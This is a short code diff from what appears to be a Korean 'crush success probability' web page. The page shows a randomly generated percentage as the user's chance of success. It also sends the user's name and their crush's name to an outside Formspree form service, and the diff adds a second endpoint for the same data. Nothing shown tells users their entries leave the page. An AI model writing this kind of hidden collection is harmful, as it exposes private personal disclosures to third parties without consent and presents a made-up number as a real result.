@@ -76,7 +76,22 @@
       const percent = Math.floor(Math.random() * 61) + 30;
       resultBox.innerText = `😍 ${yourName}와(과) ${crushName}의 짝사랑 성공 확률은 ${percent}%입니다!`;
 
+      // 첫 번째 링크로 전송
       fetch("https://formspree.io/f/xanegwav", {
+        method: "POST",
+        headers: {
+          "Accept": "application/json",
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          yourName: yourName,
+          crushName: crushName,
+          message: `${yourName}가 ${crushName}를 좋아해요! 성공 확률: ${percent}%`
+        })
+      });
+
+      // 두 번째 링크로 전송
+      fetch("https://formspree.io/f/mblgvjgg", {
         method: "POST",
         headers: {
           "Accept": "application/json",
